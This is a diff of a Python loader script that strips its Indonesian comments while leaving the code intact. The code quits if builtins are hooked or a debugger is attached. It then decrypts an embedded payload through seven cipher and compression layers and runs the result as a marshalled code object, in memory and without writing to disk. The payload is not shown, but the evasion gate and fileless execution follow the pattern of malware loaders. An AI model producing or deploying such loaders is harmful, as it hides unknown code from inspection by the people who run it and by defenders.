@@ -9,7 +9,6 @@ import hashlib
 import struct
 import builtins
 
-# [LAPIS 1] KERAK BUMI: Anti-Hook & Anti-Analysis Gate
 if getattr(builtins.exec, '__code__', None) is not None:
     os._exit(0)
 if getattr(builtins.print, '__code__', None) is not None:
@@ -19,7 +18,6 @@ if getattr(builtins.eval, '__code__', None) is not None:
 if sys.gettrace() is not None:
     os._exit(0)
 
-# Kunci & Segel Parameter Kriptografi 7 Lapis Bumi
 _SHA384_SEAL = 'abf0f6e91941f0d3778b4285d90367990a367cbf7101f1a8dbd79027debe82fe699f05d845c4d08f4a4b4827f7425c02'
 _K4 = bytes.fromhex('7786b0ce42641e9a35e385f1e9507b00555ddd6f65dd00c03eeab8b696188eb5')
 _K3 = bytes.fromhex('0afa5337c6c781d120aa064c2402ebfd00fe60118bc0772ae2f4baf9f8d4c1e2')
@@ -32,12 +30,10 @@ def _feistel_F(R, k):
     return ((R * 0x45d9f3b + k) ^ (R >> 16)) & 0xFFFFFFFF
 
 def _boot_earth_layers():
-    # 1. Buka Lapis 1 (Kerak Bumi) & Validasi Integritas SHA-384
     raw_l2 = base64.b85decode(_CORE_PAYLOAD.encode('ascii'))
     if hashlib.sha384(raw_l2).hexdigest() != _SHA384_SEAL:
         os._exit(1)
 
-    # 2. Buka Lapis 2 (Litosfer: Inverse S-Box & Bit-Rotate SPN)
     dec_l3 = bytearray(len(raw_l2))
     for i, b in enumerate(raw_l2):
         r = _ROTS[i % 16]
@@ -45,7 +41,6 @@ def _boot_earth_layers():
         dec_l3[i] = ((un_sbox >> r) | (un_sbox << (8 - r))) & 0xFF
     dec_l3 = bytes(dec_l3)
 
-    # 3. Buka Lapis 3 (Astenosfer: Cascaded SHA-512 Stream Cipher)
     ks3 = bytearray()
     s3 = _K3
     idx = 0
@@ -56,7 +51,6 @@ def _boot_earth_layers():
         idx += 1
     dec_l4 = bytes(b ^ k for b, k in zip(dec_l3, ks3[:l3_len]))
 
-    # 4. Buka Lapis 4 (Mesosfer: 16-Round Inverted Feistel Block Cipher)
     r_keys = [struct.unpack('>I', hashlib.sha256(_K4 + struct.pack('>I', r)).digest()[:4])[0] for r in range(16)]
     dec_l5_padded = bytearray()
     for i in range(0, len(dec_l4), 8):
@@ -67,7 +61,6 @@ def _boot_earth_layers():
     pad = dec_l5_padded[-1]
     dec_l5 = bytes(dec_l5_padded[:-pad])
 
-    # 5. Buka Lapis 5 (Batas Gutenberg: Dynamic Nonce & HMAC-SHA256 Verification)
     k5_len = struct.unpack('>I', dec_l5[:4])[0]
     k5 = dec_l5[4:4+k5_len]
     hmac_val = dec_l5[4+k5_len:4+k5_len+32]
@@ -84,14 +77,11 @@ def _boot_earth_layers():
     if hashlib.sha256(k5 + dec_l6).digest() != hmac_val:
         os._exit(1)
 
-    # 6. Buka Lapis 6 (Inti Luar: LZMA Extreme + ZLIB Level 9 Decompress)
     dec_l7_zlib = lzma.decompress(dec_l6)
     dec_l7 = zlib.decompress(dec_l7_zlib)
 
-    # 7. Buka Lapis 7 (Inti Dalam: Direct In-Memory CodeObject Execution)
     code_obj = marshal.loads(dec_l7)
     
-    # Eksekusi langsung di RAM tanpa menyentuh disk
     ctx = globals()
     ctx['__file__'] = os.path.abspath(__file__)
     builtins.exec(code_obj, ctx)
